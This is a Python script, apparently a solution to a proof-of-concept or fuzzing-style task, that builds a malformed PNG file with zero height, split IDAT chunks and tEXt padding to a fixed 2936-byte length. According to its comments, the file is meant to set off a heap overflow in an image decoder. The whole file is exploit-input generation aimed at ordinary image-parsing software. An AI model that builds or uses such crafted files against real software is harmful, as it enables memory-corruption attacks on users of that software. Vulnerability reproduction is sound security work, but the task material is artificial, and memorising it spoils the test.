import os
import struct
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG file with zero width or height that triggers heap overflow
        # We'll create a PNG with zero height and multiple IDAT chunks
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - width: 100, height: 0 (zero height triggers vulnerability)
        ihdr_data = struct.pack('>II', 100, 0)  # width=100, height=0
        ihdr_data += b'\x08\x02\x00\x00\x00'  # 8-bit, RGB, no compression, no filter, no interlace
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
        ihdr = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
        
        # Create IDAT chunk with compressed image data
        # Even though height is 0, we'll include data that might overflow
        scanline = b'\x00' + b'\xff\x00\x00' * 100  # Filter type 0, RGB data
        # Create enough scanlines to trigger overflow when height is misinterpreted
        image_data = scanline * 1  # Only 1 scanline since height should be 0
        
        # Compress the data
        compressed = zlib.compress(image_data)
        
        # Split compressed data into multiple IDAT chunks to trigger potential overflow
        chunk_size = 1024
        idat_chunks = []
        for i in range(0, len(compressed), chunk_size):
            chunk_data = compressed[i:i + chunk_size]
            idat_chunk = b'IDAT' + chunk_data
            idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
            idat_chunks.append(struct.pack('>I', len(chunk_data)) + idat_chunk + idat_crc)
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Assemble PNG
        png_data = png_signature + ihdr
        for idat in idat_chunks:
            png_data += idat
        png_data += iend
        
        # Add extra data to reach target length and ensure overflow
        target_length = 2936
        if len(png_data) < target_length:
            # Pad with valid tEXt chunks
            padding_needed = target_length - len(png_data)
            # Create multiple small tEXt chunks
            while padding_needed > 12:  # Minimum chunk size
                chunk_len = min(50, padding_needed - 12)
                text_data = b'Comment' + b'\x00' + b'A' * (chunk_len - 8)
                text_chunk = b'tEXt' + text_data
                text_crc = struct.pack('>I', zlib.crc32(text_chunk) & 0xffffffff)
                chunk = struct.pack('>I', len(text_data)) + text_chunk + text_crc
                if len(chunk) <= padding_needed:
                    png_data += chunk
                    padding_needed -= len(chunk)
                else:
                    break
            
            # Final padding if needed
            if padding_needed > 0:
                png_data += b'\x00' * padding_needed
        
        return png_data[:target_length]